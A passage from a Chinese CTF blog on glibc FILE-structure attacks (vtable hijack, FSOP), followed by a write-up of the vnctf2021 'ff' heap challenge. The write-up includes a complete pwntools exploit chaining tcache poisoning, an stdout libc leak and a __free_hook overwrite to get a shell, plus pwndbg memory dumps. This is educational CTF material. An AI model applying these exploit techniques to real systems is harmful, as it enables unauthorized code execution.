class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x7f75433786e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span> <span class="comment">// vtable的位置</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x562989a57010</span> ◂— <span class="number">0x0</span> <span class="comment">// 成功修改</span></span><br></pre></td></tr></table></figure>
<p>​        // 本文是基于 libc-2.23 及之前的libc上可实施的，libc-2.24 之后加入了 vtable check 机制，无法再构造vtable</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ），是一种劫持 <code>_IO_list_all</code> 来伪造文件流对象链表的利用技术，常与 house of orange 连用，通过调用 <code>_IO_flush_all_lockp</code> 函数触发</p>
<p>该函数会在下面三种情况下被调用：</p>
<ul>
<li>第一，libc 检测到内存错误从而执行 abort 流程时</li>
<li>第二，执行 exit 函数时</li>
<li>第三，main 函数返回时</li>
</ul>
<p>先分析 <code>_IO_flush_all_lockp</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp ()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	 || (fp-&gt;_vtable_offset == <span class="number">0</span></span><br><span class="line">	     &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				  &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	 )</span><br><span class="line">	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      result = EOF;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行 <code>_IO_OVERFLOW</code> 前有两个检查：（通常是采用这个伪造）</p>
<ul>
<li><code>_mode</code> &gt;= 0  </li>
<li><code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code></li>
</ul>
<p>而对 <code>_IO_OVERFLOW</code> 的调用是 <strong>虚表调用</strong> ，是可以进行劫持的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;, <span class="comment">// target</span></span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">    ................</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>
<p>可见第4片区域就是 <code>__overflow</code> 的虚表，我们可以劫持该虚表为“one_gadget”或者其他需要的函数</p>
<p><strong>利用姿势</strong></p>
<p>一般在pwn题中，我们都是构造内存错误，此时会产生一系列的函数调用路径，最终的调用为：<code>_IO_flush_all_lockp</code> —&gt; <code>_IO_OVERFLOW</code>，而这里的 <code>_IO_OVERFLOW</code> 就是文件流对象虚表的第四项指向的内容 <code>_IO_new_file_overflow</code> </p>
<p>因此我们的利用思路一般是：</p>
<ul>
<li>要么直接修改文件流对象</li>
<li>要么伪造一个_IO_FILE结构体</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.24：多了 vtable check，这就意味着我们不能利用任意地址来充当<code>vtable</code> </p>
<p>libc-2.27：完全失效</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/15/IO_2_1_stdout%20leak+Tcache%20attack/" class="post-title-link" itemprop="url">IO_2_1_stdout leak+Tcache attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-15 23:36:21" itemprop="dateCreated datePublished" datetime="2022-03-15T23:36:21+08:00">2022-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-17 13:56:51" itemprop="dateModified" datetime="2022-03-17T13:56:51+08:00">2022-03-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>vnctf2021 ff 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./pwn </span><br><span class="line"><span class="number">1.</span>add</span><br><span class="line"><span class="number">2.</span>del</span><br><span class="line"><span class="number">3.</span><span class="built_in">exit</span></span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1f</span>d4ed1f1e5db9e2f81e26150d0a5b6db56d2261, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>程序给了 libc 版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.32</span><span class="number">-0u</span>buntu3)</span> release release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[idx]);                <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经典 UAF </p>
<p><strong>入侵思路</strong></p>
<p>程序可以控制的部分太少了，连 free 的参数都不能控制，另外程序是有“打印模块”和“修改模块”的，但是“修改模块”只能使用两次，每次只能改16字节，还没法控制参数，“打印模块”也被法控制，并且只能打印一次</p>
<p>因为只能打印一次，“libc_base”，“chunk_list_addr”，“heap_addr”这些我们想要的数据就只能 leak 一个，我当然是想要 “libc_base” ，但是程序又有限制</p>
<p>因为程序限制 malloc size 的大小，所以 unsortedbin leak 挂了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = myRead();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x7E</span> )</span><br><span class="line">  size = <span class="number">127</span>;                                 <span class="comment">// 大小限制</span></span><br></pre></td></tr></table></figure>
<p>只能泄露“heap_addr”了，在加上“打印模块”的长度不够，所以还需要一些操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;1&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr=eval(hex(leak_addr)+<span class="string">&#x27;0&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+hex(heap_addr))</span><br></pre></td></tr></table></figure>
<p>只知道“heap_addr”，我的第一反应是打 unlink，但是没有 off-by-one 也打不了，我觉得我止步于此了，但我还是想谈一谈我的想法：</p>
<p>这题没有泄露“libc_base”，大概率是要打 house of roman 爆破libc库函数的，关键就在于这个 size 检查把 unsortedbin 限制了，导致 main_arene 写不进来，当然 house of roman 也没毛用了</p>
<p>没有“libc_base”还有一个解决方式，IO_2_1_stdout leak，这种攻击可以和 house of roman 结合（比如我刚刚复现过的 nepctf2021 sooooeasy），但缺少 main_arene 的核心问题还是没有解决</p>
<p>先挂上大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process([file_path])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line">elf=ELF(file_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content=<span class="string">b&quot;1\n&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0xa6c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        delete()</span><br><span class="line">        show()</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">        log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">        edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">        enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">        edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x38</span>, p16(stdout))</span><br><span class="line">        add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">        log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">        <span class="keyword">if</span>(libc.address&gt;<span class="number">0x5000000000000</span> <span class="keyword">or</span> libc.address &lt; <span class="number">0x5000</span>):</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;wrong and continue\n&quot;</span>)</span><br><span class="line">        	<span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = process([file_path])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>经过测试，大佬的 exp 也不是百分之百可以打通的，因为有时候会 leak 异常的 libc_base，所以我修改了一下 exp ，使其可以舍弃掉一些异常的 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span> <span class="comment"># 16进制下填3个0，2进制下填3*4个0</span></span><br><span class="line">log.success(<span class="string">&quot;heap base is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure>
<p>大佬的 heap_addr 泄露和我的思路一样，但是比我的简洁多了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete() <span class="comment"># 释放&gt;&gt;修改FD&gt;&gt;释放(tcache dup，类似于Double free)</span></span><br><span class="line">enc = ((heap_base + <span class="number">0x2a0</span>) &gt;&gt; <span class="number">12</span>) ^ (heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(p64(enc) + p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line"><span class="comment"># 利用tcache dup申请tcache_perthread_struct </span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0007000000000000</span> <span class="comment">// 修改count为&#x27;7&#x27;</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>delete() 执行之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd000</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd000</span></span><br></pre></td></tr></table></figure>
<p>大佬果然有办法搞到“main_arena”，这里其实是利用了 tcache 的机制：</p>
<ul>
<li>当某一个tcache链表满了7个，再有对应的chunk（不属于fastbin的）被free，就直接进入了unsortedbin中</li>
<li>tcache_perthread_struct 结构一般在 heapbase+0x10（0x8）的位置，对应tcache的数目是char类型</li>
</ul>
<p>因为程序没法控制“释放模块”的参数，所以想通过正常手段填满 tache 显然不可能了，但是我们已知 heapbase 的地址，可以通过 tcache dup 来劫持 tcache_perthread_struct，将<code>0x290</code>大小堆块对应的<code>count</code>设置为<code>7</code>，释放后就会把整个 tcache_perthread_struct 放入 unsortedbin（这种攻击模式被称为 tcache perthread corruption）</p>
<p>注意：因为 libc-2.32 新增加的特性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
<p>程序会对 <code>tcache-&gt;fd</code> 指针的加密（还有这种操作？），所以我们在伪造 FD 的时候也要进行一次相同的加密</p>
<p>接下来申请了两个 chunk 把“heap_base + 0xb0”连接入“tcachebin”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, p32(<span class="number">0</span>) + p16(<span class="number">2</span>) + p16(<span class="number">0</span>) + p16(<span class="number">1</span>) + p16(<span class="number">0</span>) + p32(<span class="number">0</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(heap_base + <span class="number">0xb0</span>)) <span class="comment"># heap_base+0xb0 to tache</span></span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<p>释放后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br><span class="line"><span class="number">0x558b1cfcd0c0</span>:	<span class="number">0x0000000558b1cfcd</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0d0</span>:	<span class="number">0x0000000000000000</span>	